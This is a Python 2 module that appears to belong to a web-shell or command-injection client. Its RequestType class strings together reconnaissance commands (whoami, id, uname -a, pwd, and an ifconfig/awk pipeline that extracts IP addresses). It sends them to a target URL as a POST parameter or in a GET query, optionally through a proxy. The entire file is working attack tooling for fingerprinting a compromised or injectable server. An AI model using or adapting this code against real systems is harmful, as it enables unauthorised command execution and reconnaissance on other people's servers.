from urllib import urlencode, quote
from urllib2 import ProxyHandler, build_opener, install_opener
from menu import getargs, Colors

url = getargs.url
method = getargs.method
parameter = getargs.parameter
proxy = getargs.proxy


class RequestType(object):
    '''
    Check for the used method POST or GET
    Adding some commands to cmd requires updating
    self.info in ServerInfo class 'server_info.py'
    '''
    def __init__(self, url=None, method='get', parameter=None):
        self.url = url
        self.method = method
        self.parameter = parameter
        self.cmd = 'whoami;'
        self.cmd += 'id;'
        self.cmd += 'uname -a;'
        self.cmd += 'pwd;'
        self.cmd += '/sbin/ifconfig |grep -B1 "inet addr" |awk \'{ if ( $1 == "inet" ) { print $2 } else if ( $2 == "Link" ) { printf "%s:" ,$1 } }\' |awk -F: \'{ print $3 }\''

    def get_page_source(self):
        proxy_support = ProxyHandler({'http': proxy} if proxy else {})
        opener = build_opener(proxy_support)
        install_opener(opener)
        errmsg = '\n{0}[!] Check your connection or the proxy if you\'re using it{1}'.format(Colors.RED, Colors.END)
        # check if the method is post or get
        if method == 'post' or parameter:
            parameters = urlencode({parameter: self.cmd})
            try:
                sc = opener.open(url, parameters)
                return sc
            except:
                print errmsg
                exit(1)
        # if the used method set get
        else:
            try:
                sc = opener.open('{}{}'.format(url, quote(self.cmd)))
                return sc
            except:
                print errmsg
                exit(1)

request_type = RequestType()
